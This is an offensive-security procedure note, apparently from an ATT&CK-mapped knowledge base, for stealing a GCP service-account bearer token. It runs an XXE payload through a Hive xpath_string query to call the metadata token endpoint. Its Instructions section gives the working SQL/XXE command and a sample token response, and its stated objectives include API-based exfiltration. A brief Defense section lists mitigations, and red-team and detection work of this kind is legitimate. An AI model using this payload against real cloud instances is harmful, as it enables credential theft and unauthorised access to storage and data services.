---
id: uuid-5
tags:
  - xxe
  - token-theft
  - bearer-token
type: procedure
tools:
  - '[[tools/Hive-JDBC]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/hive-xxe-fetch-token]]'
verified: false
platforms:
  - GCP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T04:08:55.619Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
  - '[[Steal Application Access Token]]'
---
# Retrieve-Service-Account-Bearer-Token-via-XXE

## Summary

This procedure exploits XXE to SSRF the GCP metadata token endpoint, stealing a bearer token from the default service account with scopes for BigQuery, BigTable, and Storage.

## Description

The metadata service provides temporary tokens without auth from the instance context. XXE resolves the /token path, returning a JSON with access_token usable for API calls.

## Requirements

1. Successful metadata access via prior XXE
2. Default service account present on instance

## Defense

Defensive measures and detection strategies:

- Disable metadata server access or use shielded VMs
- Implement token scoping and short expiration
- Detect anomalous token usage in GCP audit logs

## Objectives

1. Obtain valid bearer token
2. Confirm scopes for resource access
3. Enable API-based exfiltration

## Instructions

### Step 1: Target Token Endpoint

**Context**: Use XXE to fetch the token JSON from metadata.

**Command** ([[commands/hive-xxe-fetch-token]]):
```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

> Returns { "access_token": "[redacted]", "expires_in": 2765, "token_type": "Bearer" }.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials
- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used

- [[commands/hive-xxe-fetch-token]]

## Tools Used

- [[tools/Hive-JDBC]]

## Tags

- [[xxe]]
- [[token-theft]]
- [[bearer-token]]
